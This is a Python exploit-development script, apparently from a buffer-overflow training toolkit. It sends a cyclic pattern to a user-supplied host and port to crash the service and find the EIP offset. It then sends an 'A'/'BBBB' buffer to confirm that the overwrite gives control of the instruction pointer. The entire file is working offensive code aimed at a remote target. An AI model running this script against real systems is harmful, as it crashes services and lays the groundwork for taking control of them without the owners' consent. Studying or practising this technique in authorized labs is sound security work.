#!/usr/bin/env python3

from pwn import cyclic_metasploit, cyclic_metasploit_find
from utils import *
import string
import sys


def find_offset():

    answer = input("Did the app crash ? (yes/no): ").strip()
    
    if not get_answer(answer) :
        print("[-] Re-run the fuzzer with higher value and comeback !")
        sys.exit(-1)

    eip = input("Enter the value of EIP after the crash in its hex format (0x13371337): ").strip()
    try :
        eip = int(eip, 16)
    except Exception as e :
        print("[-] Wrong EIP address format !")
        sys.exit(-1)
    
    eip_offset = cyclic_metasploit_find(eip)
    print("[*] EIP offset is >>> {} <<<\n\n".format(eip_offset))
    return eip_offset

def check_offset(bof_val, eip_offset):
    answer = input("[!] Wanna check the offset ? (yes/no): ").strip()

    if not get_answer(answer) :
        print("[*] Thanks, good luck hunting bad chars !")
        return False

    print("[!] Go restart the app !")
    input("[!] When the app is restarted, press any key...")

    buffer = "A" * eip_offset + "B" * 4 + "A" * (bof_val - eip_offset - 4 )
    print("[!] Going to overwrite EIP with BBBB (42424242)...")
    connect_send(target, port, buffer)
    
    answer = input("Was EIP overwritten with 0x42424242 ? (yes/no): ").strip()
    return get_answer(answer)

if __name__ == "__main__" :

    if len(sys.argv) != 4 :
        print("[!] Usage: {} 'target' 'port' 'overflow value'".format(sys.argv[0]))
        sys.exit(1)

    target  = sys.argv[1]
    port    = int(sys.argv[2])
    bof_val = int(sys.argv[3])


    buffer = cyclic_metasploit(bof_val).decode()
    connect_send(target, port, buffer)

    eip_offset = find_offset()
    ret = check_offset(bof_val, eip_offset)

    print("\n")
    if ret :
        print("[*] EIP offset is >>> {} <<< ".format(eip_offset))
    else :
        print("[-] Couldn't find EIP offset ! ")
        print("[-] Check again the overflow value and/or the overwritten value of EIP")